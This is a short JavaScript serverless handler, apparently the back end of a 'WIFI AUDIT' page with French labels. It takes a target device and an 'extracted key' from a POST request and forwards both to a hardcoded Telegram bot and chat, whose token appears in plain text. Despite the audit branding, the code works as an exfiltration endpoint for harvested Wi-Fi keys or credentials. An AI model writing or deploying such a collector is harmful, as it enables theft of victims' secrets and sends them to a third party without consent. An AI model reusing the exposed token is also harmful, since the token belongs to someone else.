export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Méthode non autorisée');
    
    const { device, menace } = req.body;
    const BOT_TOKEN = "8558629634:AAFofbmQxb_V2zrKQrfs35Gj1RIfMHrGiT8";
    const CHAT_ID = "6224971749"; // Ton ID Mamatin Banbino

    const text = `📡 **WIFI AUDIT - NDIAYE TECHN** 📡\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `🎯 **Cible Scan** : ${device}\n` +
                 `🔑 **Clé Extraite** : ${menace}\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `✅ *Rapport généré sur Anastasia Shield*`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
        return res.status(200).json({ success: true });
    } catch (e) {
        return res.status(500).json({ error: "Erreur d'envoi Telegram" });
    }
}
